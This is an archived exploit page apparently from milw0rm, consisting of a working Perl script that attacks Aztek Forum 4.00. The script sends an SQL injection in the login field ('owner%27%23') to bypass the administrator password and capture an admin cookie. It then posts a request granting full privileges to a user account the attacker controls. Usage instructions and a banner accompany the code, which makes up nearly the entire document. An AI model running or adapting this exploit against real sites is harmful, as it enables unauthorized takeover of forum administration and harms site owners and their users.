<html><head><title>Aztek Forum 4.00 (myadmin.php) User Privilege Escalation Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;
# Aztek Forum 4.00 Change User Rights Remote Exploit
#
# only if the magic_quote are : OFF &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
#
# Hum hum , sorry for my bad english i'm french ;)
# Note : Before using this exploit you must create a count on the board :) 
# And this count will receive the administrator
# rights !
# aztek_gar.pl &lt;host&gt; &lt;path&gt; &lt;board_owner&gt; &lt;user&gt;
# aztek_gar.pl 127.0.0.1 /aztek/ Admin Attacker
#
#
#+------------------------------------------------------------+
#- Aztek 4.0 Give Admin rights to a normal user   -
#-                                                                           
#     -
#-                         coded by _Sparah_                      -
#+-----------------------------------------------------------+
#
# [~] Connection to 127.0.0.1 on port 80 ...
#
# [+] CoOkie : ATK_ADMIN=6688f12bf61a432c22e38c46a194e6ea
#
# [!] D0ne !

# var
$host = $ARGV[0];
$path = $ARGV[1];
$owner = $ARGV[2];
$user = $ARGV[3];

#banner
if (@ARGV&lt;4) {
print q(

+--------+
| banner |
+---------------------------------------------+
|Aztek 4.0 Give Admin Rights to a normal user |
|                                             |
|                              by _Sparah_    |
+---------------------------------------------+
                    -=[X]=-
+---------------------------------------------+
| http://www.eos-team.be/                     |
| http://sparah.next-touch.com/ (soon)        |
+---------------------------------------------+
                    -=[X]=-
+---------------------------------------------+
| Usage :                                     |
|                                             |
| *.pl &lt;host&gt; &lt;path&gt; &lt;board_owner&gt; &lt;user&gt;     |
| ex : 127.0.0.1 /aztek/ Admin Attacker       |
|                                             |
+---------------------------------------------+
                                       | E.o.S|
                                       +------+

);exit();}

print &quot;

+----------------------------------------------+
- Aztek 4.0 Give Admin rights to a normal user -
-                                              -
-                         coded by _Sparah_    -
+----------------------------------------------+

&quot;;

print &quot;\n[~] Connection to $host on port 80 ...\n&quot;;

#1st request
$req1= &quot;login=&quot;.$owner.&quot;%27%23&amp;passwd=&quot;;
$len1= length $req1;

$send = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort 
=&gt; &quot;80&quot;) || die &quot;\n[-] Connection failed...&quot;;
print $send &quot;POST &quot;.$path.&quot;myadmin.php?action=login HTTP/1.1\n&quot;;
print $send &quot;Host: $host\n&quot;;
print $send &quot;Cookie: ATK_PASSWD=; ATK_LOGIN=nobody; ATK_SESS=\n&quot;;
print $send &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $send &quot;Content-Length: &quot;.$len1.&quot;\n\n&quot;;
print $send &quot;&quot;.$req1.&quot;\n&quot;;

# take cookie value
while(chomp($cookie=&lt;$send&gt;))
{
    if ($cookie =~ /Set\-Cookie\: (\S+)/)
    {
        $ATK=$1;
        close($send);
    }
}

print &quot;\n[+] CoOkie : &quot;.$ATK.&quot;\n&quot;;

# 2nd request
$req2 = 
&quot;login=&quot;.$user.&quot;&amp;priv%5B%5D=0&amp;priv%5B%5D=1&amp;priv%5B%5D=4&amp;priv%5B%5D=2&amp;priv%5B%5D=3&amp;priv%5B%5D=5&quot;;
$len2 = length $req2;
$data = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort 
=&gt; &quot;80&quot;) || die &quot;\n[-] Connection failed...&quot;;
print $data &quot;POST &quot;.$path.&quot;myadmin.php?action=admin&amp;choix=6 HTTP/1.1\n&quot;;
print $data &quot;Host: &quot;.$host.&quot;\n&quot;;
print $data &quot;Cookie: &quot;.$ATK.&quot;\n&quot;;
print $data &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $data &quot;Content-Length: &quot;.$len2.&quot;\n\n&quot;;
print $data &quot;&quot;.$req2.&quot;\n&quot;;
read $data,$res,9000;
print $res;
print &quot;\n[!] D0ne !\n\n&quot;;

# milw0rm.com [2006-03-26]</pre></html>